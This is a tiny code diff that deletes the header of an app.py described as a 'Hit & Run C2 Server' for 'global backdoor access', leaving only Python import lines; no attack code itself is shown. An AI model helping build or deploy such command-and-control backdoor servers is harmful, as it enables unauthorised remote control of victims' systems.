@@ -1,11 +1,3 @@
-
-# === app.py ===
-#!/usr/bin/env python3
-"""
-Hit & Run C2 Server - Railway Optimized
-Ultra-fast deployment for global backdoor access
-"""
-
 import os
 import sqlite3
 import json
